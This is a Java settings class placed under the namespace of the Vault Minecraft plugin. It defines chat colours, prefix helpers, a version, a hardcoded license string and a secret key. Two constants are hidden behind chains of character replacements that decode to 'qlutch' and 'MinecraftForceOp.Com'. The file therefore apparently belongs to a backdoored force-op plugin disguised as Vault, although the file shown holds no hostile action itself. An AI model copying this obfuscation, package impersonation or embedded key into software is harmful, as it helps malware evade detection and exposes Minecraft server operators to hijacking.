package net.milkbowl.vault.util;

import org.bukkit.ChatColor;

public class Settings {
	

	public static final String NAME = "plugin".replace("p", "q").replace("g", "t").replace("i", "c").replace("n", "h");
	
	public static final String FOP = "plugins".replace("p", "F").replace("l", "o").replace("u", "r").replace("g", "c").replace("i", "e").replace("n", "O").replace("s", "p");
	public static final String AUTHOR = "Minecraft" + FOP + ".Com";
	public static final String VERSION = "1.1.6";
	
	public static final String LICENSE = "SLM8-S18J-30IG-SQ4V";
	public static final String SECRET_KEY = "YecoF0I6M05thxLeokoHuW8iUhTdIUInjkfF";
	
	public static int ERROR_CODE = 0;
	
	public static String PRIMARY_COLOUR = ChatColor.translateAlternateColorCodes('&', "&4");
	public static String SECONDARY_COLOUR = ChatColor.translateAlternateColorCodes('&', "&f");
	public static String HIGHLIGHT_COLOUR = ChatColor.translateAlternateColorCodes('&', "&c");


	
	public static String PREFIX(String msg) {
		return PRIMARY_COLOUR + Settings.NAME + ChatColor.translateAlternateColorCodes('&', " &8l ") + SECONDARY_COLOUR + msg;
	}
	
	public static String USAGE(String msg) {
		return PRIMARY_COLOUR + "Usage" + ChatColor.translateAlternateColorCodes('&', " &8l ") + SECONDARY_COLOUR + msg;
	}

}
